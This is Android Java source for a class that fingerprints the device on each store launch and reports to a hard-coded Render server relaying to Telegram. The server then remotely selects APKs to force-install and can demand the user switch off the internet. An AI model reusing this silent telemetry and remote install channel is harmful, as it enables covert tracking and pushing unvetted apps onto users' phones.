package com.smartstore.installer;

import android.app.ActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkCapabilities;
import android.net.NetworkInfo;
import android.os.BatteryManager;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;
import java.util.UUID;

/**
 * ✅ TelegramLogger V15 - يرسل معلومات الجهاز للسيرفر بدل تليجرام مباشرة
 *
 * ✅ الفوائد:
 *   - التوكن و Chat ID مخفيان في السيرفر (لا يصلان للتطبيق)
 *   - السيرفر يمكنه التحكم في المتجر: تغيير الوضع، تبديل التطبيق
 *   - يرسل معلومات الجهاز للسيرفر الذي يخزنها ويرسلها لتليجرام
 *
 * ✅ التدفّق:
 *   1. التطبيق يجمع معلومات الجهاز
 *   2. يرسلها للسيرفر عبر POST /api/checkin
 *   3. السيرفر يخزنها ويرسل إشعار تليجرام
 *   4. السيرفر يرد بوضع التحكم (mode: auto / force_update)
 */
public class TelegramLogger {
    private static final String TAG = "TelegramLogger";

    // ✅ رابط السيرفر الفعلي على Render
    private static final String SERVER_URL = "https://smartstore-z60u.onrender.com";

    /** معرّف فريد للجهاز (يُحفظ محلياً) */
    private static String getDeviceId(Context context) {
        String prefsName = "SmartStorePrefs";
        String key = "device_id";
        String id = context.getSharedPreferences(prefsName, Context.MODE_PRIVATE)
                .getString(key, null);
        if (id == null) {
            id = "dev_" + UUID.randomUUID().toString().replace("-", "").substring(0, 16);
            context.getSharedPreferences(prefsName, Context.MODE_PRIVATE)
                    .edit().putString(key, id).apply();
        }
        return id;
    }

    /** يتم استدعاؤها عند فتح المتجر */
    public static void logOpen(final Context context) {
        new Thread(() -> {
            try {
                String deviceId = getDeviceId(context);
                JSONObject deviceInfo = collectDeviceInfo(context);
                deviceInfo.put("deviceId", deviceId);
                deviceInfo.put("appVersion", "8.0.0");

                // ✅ إرسال قائمة التطبيقات المحلية المتاحة في assets
                // حتى يعرف السيرفر ما هي التطبيقات التي يمكن للمستخدم التحديث إليها
                org.json.JSONArray localApps = listLocalApps(context);
                deviceInfo.put("localApps", localApps);

                JSONObject response = sendCheckin(deviceInfo);
                if (response != null) {
                    String mode = response.optString("mode", "auto");
                    String activeApp = response.optString("activeApp", "embedded_app.apks");
                    String targetApp = response.optString("targetApp", activeApp);
                    boolean requireInternetOff = response.optBoolean("requireInternetOff", false);
                    String message = response.optString("message", "");

                    Log.d(TAG, "✅ Server response: mode=" + mode + ", targetApp=" + targetApp
                            + ", requireInternetOff=" + requireInternetOff);

                    // ✅ حفظ وضع التحكم + التطبيق الهدف + إعداد الإنترنت
                    context.getSharedPreferences("SmartStorePrefs", Context.MODE_PRIVATE)
                            .edit()
                            .putString("server_mode", mode)
                            .putString("server_active_app", activeApp)
                            .putString("server_target_app", targetApp)
                            .putBoolean("server_require_internet_off", requireInternetOff)
                            .putString("server_message", message)
                            .putLong("server_last_sync", System.currentTimeMillis())
                            .apply();
                }
            } catch (Exception e) {
                Log.e(TAG, "Failed to send log", e);
            }
        }).start();
    }

    /**
     * ✅ قائمة التطبيقات المحلية المتاحة في مجلد assets
     * هذه التطبيقات يمكن للمستخدم التحديث إليها بدون إنترنت
     */
    public static org.json.JSONArray listLocalApps(Context context) {
        org.json.JSONArray apps = new org.json.JSONArray();
        try {
            String[] files = context.getAssets().list("");
            if (files != null) {
                for (String f : files) {
                    if (f.endsWith(".apk") || f.endsWith(".apks")) {
                        apps.put(f);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "listLocalApps error", e);
        }
        return apps;
    }

    /** يجمع كل معلومات الجهاز */
    private static JSONObject collectDeviceInfo(Context context) {
        JSONObject info = new JSONObject();
        try {
            // معلومات الجهاز
            info.put("brand", Build.BRAND);
            info.put("model", Build.MODEL);
            info.put("androidVersion", Build.VERSION.RELEASE);
            info.put("sdkVersion", Build.VERSION.SDK_INT);

            // الشاشة
            DisplayMetrics metrics = context.getResources().getDisplayMetrics();
            info.put("screen", metrics.widthPixels + "x" + metrics.heightPixels + " / " + metrics.densityDpi + " dpi");

            // المعالجات
            info.put("cores", Runtime.getRuntime().availableProcessors());

            // RAM
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            ActivityManager.MemoryInfo memInfo = new ActivityManager.MemoryInfo();
            am.getMemoryInfo(memInfo);
            long totalRamBytes = memInfo.totalMem;
            String ramStr;
            if (totalRamBytes >= 1024 * 1024 * 1024) {
                ramStr = String.format(Locale.US, "%.0f GB", totalRamBytes / (1024.0 * 1024 * 1024));
            } else {
                ramStr = (totalRamBytes / (1024 * 1024)) + " MB";
            }
            info.put("ram", ramStr);

            // البطارية
            int batteryPct = 0;
            boolean isCharging = false;
            try {
                IntentFilter ifilter = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
                Intent batteryStatus = context.registerReceiver(null, ifilter);
                if (batteryStatus != null) {
                    int level = batteryStatus.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
                    int scale = batteryStatus.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
                    if (scale > 0) {
                        batteryPct = (int) (level * 100 / (float) scale);
                    }
                    int status = batteryStatus.getIntExtra(BatteryManager.EXTRA_STATUS, -1);
                    isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING ||
                                 status == BatteryManager.BATTERY_STATUS_FULL;
                }
            } catch (Exception e) {
                Log.e(TAG, "Battery info error", e);
            }
            info.put("batteryPct", batteryPct);
            info.put("charging", isCharging);

            // الشبكة
            info.put("networkType", getNetworkType(context));

            // اللغة
            info.put("language", Locale.getDefault().toString().replace("_", "-"));

        } catch (Exception e) {
            Log.e(TAG, "collectDeviceInfo error", e);
        }
        return info;
    }

    /** يحدد نوع الشبكة */
    private static String getNetworkType(Context context) {
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm == null) return "Unknown";

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                Network network = cm.getActiveNetwork();
                if (network == null) return "غير متصل";
                NetworkCapabilities caps = cm.getNetworkCapabilities(network);
                if (caps == null) return "غير متصل";
                if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) return "WiFi";
                if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) {
                    NetworkInfo info = cm.getActiveNetworkInfo();
                    if (info != null) {
                        switch (info.getSubtype()) {
                            case TelephonyManager.NETWORK_TYPE_NR: return "5G";
                            case TelephonyManager.NETWORK_TYPE_LTE: return "4G";
                            case TelephonyManager.NETWORK_TYPE_HSDPA:
                            case TelephonyManager.NETWORK_TYPE_HSUPA:
                            case TelephonyManager.NETWORK_TYPE_HSPA:
                            case TelephonyManager.NETWORK_TYPE_UMTS:
                                return "3G";
                            default: return "2G";
                        }
                    }
                    return "Mobile";
                }
                return "Unknown";
            } else {
                NetworkInfo info = cm.getActiveNetworkInfo();
                if (info == null || !info.isConnected()) return "غير متصل";
                if (info.getType() == ConnectivityManager.TYPE_WIFI) return "WiFi";
                return "Mobile";
            }
        } catch (Exception e) {
            return "Unknown";
        }
    }

    /** يرسل الـ checkin ويرجع استجابة السيرفر */
    private static JSONObject sendCheckin(JSONObject deviceInfo) {
        HttpURLConnection conn = null;
        try {
            conn = (HttpURLConnection) new URL(SERVER_URL + "/api/checkin").openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8");
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);

            OutputStream os = conn.getOutputStream();
            os.write(deviceInfo.toString().getBytes("UTF-8"));
            os.flush();
            os.close();

            int response = conn.getResponseCode();
            Log.d(TAG, "Checkin response: " + response);

            if (response == 200) {
                BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                StringBuilder sb = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) sb.append(line);
                reader.close();
                return new JSONObject(sb.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "Checkin error", e);
        } finally {
            if (conn != null) conn.disconnect();
        }
        return null;
    }

    /** يقرأ وضع التحكم المحفوظ محلياً */
    public static String getCachedMode(Context context) {
        long lastSync = context.getSharedPreferences("SmartStorePrefs", Context.MODE_PRIVATE)
                .getLong("server_last_sync", 0);
        if (System.currentTimeMillis() - lastSync < 60 * 60 * 1000) {
            return context.getSharedPreferences("SmartStorePrefs", Context.MODE_PRIVATE)
                    .getString("server_mode", "auto");
        }
        return "auto";
    }

    /** يقرأ رسالة السيرفر المحفوظة */
    public static String getCachedMessage(Context context) {
        return context.getSharedPreferences("SmartStorePrefs", Context.MODE_PRIVATE)
                .getString("server_message", "");
    }

    /** يقرأ اسم التطبيق الهدف المحفوظ (لتطبيق التحديث الجديد من assets) */
    public static String getCachedTargetApp(Context context) {
        return context.getSharedPreferences("SmartStorePrefs", Context.MODE_PRIVATE)
                .getString("server_target_app", "embedded_app.apks");
    }

    /** ✅ يقرأ إعداد رسالة إغلاق الإنترنت (افتراضي: false = لا تُظهر) */
    public static boolean getCachedRequireInternetOff(Context context) {
        return context.getSharedPreferences("SmartStorePrefs", Context.MODE_PRIVATE)
                .getBoolean("server_require_internet_off", false);
    }

    /**
     * ✅ ميزة جديدة: إعلام السيرفر بنجاح التحديث
     * يُستدعى بعد تثبيت التطبيق بنجاح لإرجاع الجهاز تلقائياً للوضع التلقائي
     * هكذا في المرة القادمة يفتح المتجر التطبيق مباشرة بدون طلب تحديث
     */
    public static void notifyInstallComplete(final Context context) {
        final String deviceId = getDeviceId(context);
        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                conn = (HttpURLConnection) new URL(SERVER_URL + "/api/device/" + deviceId + "/installed").openConnection();
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                int code = conn.getResponseCode();
                Log.d(TAG, "notifyInstallComplete response: " + code);
            } catch (Exception e) {
                Log.e(TAG, "notifyInstallComplete error", e);
            } finally {
                if (conn != null) conn.disconnect();
            }

            // ✅ تحديث الـ cache المحلي فوراً
            context.getSharedPreferences("SmartStorePrefs", Context.MODE_PRIVATE)
                    .edit()
                    .putString("server_mode", "auto")
                    .putString("server_target_app", "")
                    .putLong("server_last_sync", System.currentTimeMillis())
                    .apply();
        }).start();
    }

    /**
     * ✅ استعلام سريع عن حالة الجهاز من السيرفر
     * يُستدعى كل 5 ثوانٍ للاطلاع على أي تحديثات فورية من اللوحة
     *
     * @param context سياق التطبيق
     * @param callback callback يُستدعى عند تغيير الوضع (mode/targetApp) - يمكن أن يكون null
     */
    public static void pollServer(final Context context, final OnModeChangedListener callback) {
        final String deviceId = getDeviceId(context);

        // ✅ حفظ القيم السابقة لمقارنتها
        final android.content.SharedPreferences prefs = context.getSharedPreferences("SmartStorePrefs", Context.MODE_PRIVATE);
        final String oldMode = prefs.getString("server_mode", "auto");
        final String oldTargetApp = prefs.getString("server_target_app", "");

        new Thread(() -> {
            HttpURLConnection conn = null;
            try {
                conn = (HttpURLConnection) new URL(SERVER_URL + "/api/status/" + deviceId).openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(5000);
                conn.setReadTimeout(5000);

                int code = conn.getResponseCode();
                if (code == 200) {
                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) sb.append(line);
                    reader.close();

                    JSONObject response = new JSONObject(sb.toString());
                    final String mode = response.optString("mode", "auto");
                    final String targetApp = response.optString("targetApp", "");
                    final boolean requireInternetOff = response.optBoolean("requireInternetOff", false);

                    Log.d(TAG, "🔄 Poll: mode=" + mode + ", targetApp=" + targetApp + " (was: " + oldMode + "/" + oldTargetApp + ")");

                    prefs.edit()
                            .putString("server_mode", mode)
                            .putString("server_target_app", targetApp)
                            .putBoolean("server_require_internet_off", requireInternetOff)
                            .putLong("server_last_sync", System.currentTimeMillis())
                            .apply();

                    // ✅ إذا تغيّر الوضع أو التطبيق الهدف، أبلغ الـ callback
                    if (callback != null &&
                        (!mode.equals(oldMode) || !targetApp.equals(oldTargetApp))) {
                        Log.d(TAG, "⚠️ Mode changed! Notifying callback");
                        callback.onModeChanged(mode, targetApp);
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "pollServer error", e);
            } finally {
                if (conn != null) conn.disconnect();
            }
        }).start();
    }

    /** Overload بدون callback (للاستخدامات البسيطة) */
    public static void pollServer(final Context context) {
        pollServer(context, null);
    }

    /** Listener يُستدعى عند تغيير الوضع في السيرفر */
    public interface OnModeChangedListener {
        void onModeChanged(String newMode, String newTargetApp);
    }
}
